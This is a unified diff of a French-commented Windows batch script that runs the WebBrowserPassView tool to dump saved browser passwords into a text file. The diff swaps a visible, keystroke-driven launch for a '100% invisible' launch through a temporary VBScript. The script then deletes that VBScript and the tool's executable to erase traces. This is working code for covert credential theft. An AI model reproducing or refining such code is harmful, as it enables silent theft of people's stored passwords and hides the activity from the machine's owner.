@@ -947,24 +947,15 @@ if "%custom_filename%"=="" (
 set "OUTPUT_NAME=%custom_filename%.txt"
 set "OUTPUT=%~dp0%OUTPUT_NAME%"
 
-echo.
-echo Lancement de WebBrowserPassView...
-
 if exist "%~dp0WebBrowserPassView.cfg" del /F /Q "%~dp0WebBrowserPassView.cfg" >nul 2>&1
 cd /d "%~dp0"
 
-start "" "%WBPV%"
-powershell -NoProfile -Command "Add-Type -TypeDefinition 'using System; using System.Runtime.InteropServices; public class Win32{ [DllImport(\"user32.dll\")] public static extern bool ShowWindow(IntPtr h, int n); [DllImport(\"kernel32.dll\")] public static extern IntPtr GetConsoleWindow(); }'; [Win32]::ShowWindow([Win32]::GetConsoleWindow(), 6)" >nul 2>&1
-
-timeout /t 4 /nobreak >nul
-
-echo Traitement en cours...
-powershell -Command "Set-Clipboard -Value '%OUTPUT%'; $wsh = New-Object -ComObject WScript.Shell; if($wsh.AppActivate('WebBrowserPassView')){ Start-Sleep -Milliseconds 400; $wsh.SendKeys('^a'); Start-Sleep -Milliseconds 100; $wsh.SendKeys('^s'); Start-Sleep -Milliseconds 1200; $wsh.SendKeys('^v'); Start-Sleep -Milliseconds 200; $wsh.SendKeys('{ENTER}') }" >nul 2>&1
-
-timeout /t 3 /nobreak >nul
-
-taskkill /F /IM WebBrowserPassView.exe >nul 2>&1
-timeout /t 2 /nobreak >nul
+rem Lancement 100% invisible via VBScript temporaire
+set "VBS_TMP=%TEMP%\wbpv_run_%RANDOM%.vbs"
+echo Set wsh = CreateObject("WScript.Shell") > "%VBS_TMP%"
+echo wsh.Run """%WBPV%"" /stext ""%OUTPUT%""", 0, True >> "%VBS_TMP%"
+wscript //nologo "%VBS_TMP%"
+del /F /Q "%VBS_TMP%" >nul 2>&1
 
 del /F /Q "%WBPV%" >nul 2>&1
 if exist "%WBPV%" powershell -Command "Remove-Item -Path '%WBPV%' -Force" >nul 2>&1
@@ -993,23 +984,15 @@ if "%custom_filename%"=="" (
 set "OUTPUT_NAME=%custom_filename%.txt"
 set "OUTPUT=%~dp0%OUTPUT_NAME%"
 
-echo.
-echo Lancement de WebBrowserPassView...
-
 if exist "%~dp0WebBrowserPassView.cfg" del /F /Q "%~dp0WebBrowserPassView.cfg" >nul 2>&1
 cd /d "%~dp0"
 
-start "" "%WBPV%"
-powershell -NoProfile -Command "Add-Type -TypeDefinition 'using System; using System.Runtime.InteropServices; public class Win32{ [DllImport(\"user32.dll\")] public static extern bool ShowWindow(IntPtr h, int n); [DllImport(\"kernel32.dll\")] public static extern IntPtr GetConsoleWindow(); }'; [Win32]::ShowWindow([Win32]::GetConsoleWindow(), 6)" >nul 2>&1
-
-timeout /t 4 /nobreak >nul
-
-powershell -Command "Set-Clipboard -Value '%OUTPUT%'; $wsh = New-Object -ComObject WScript.Shell; if($wsh.AppActivate('WebBrowserPassView')){ Start-Sleep -Milliseconds 400; $wsh.SendKeys('^a'); Start-Sleep -Milliseconds 100; $wsh.SendKeys('^s'); Start-Sleep -Milliseconds 1200; $wsh.SendKeys('^v'); Start-Sleep -Milliseconds 200; $wsh.SendKeys('{ENTER}') }" >nul 2>&1
-
-timeout /t 3 /nobreak >nul
-
-taskkill /F /IM WebBrowserPassView.exe >nul 2>&1
-timeout /t 2 /nobreak >nul
+rem Lancement 100% invisible via VBScript temporaire
+set "VBS_TMP=%TEMP%\wbpv_run_%RANDOM%.vbs"
+echo Set wsh = CreateObject("WScript.Shell") > "%VBS_TMP%"
+echo wsh.Run """%WBPV%"" /stext ""%OUTPUT%""", 0, True >> "%VBS_TMP%"
+wscript //nologo "%VBS_TMP%"
+del /F /Q "%VBS_TMP%" >nul 2>&1
 
 if not exist "%OUTPUT%" (
   del /F /Q "%WBPV%" >nul 2>&1
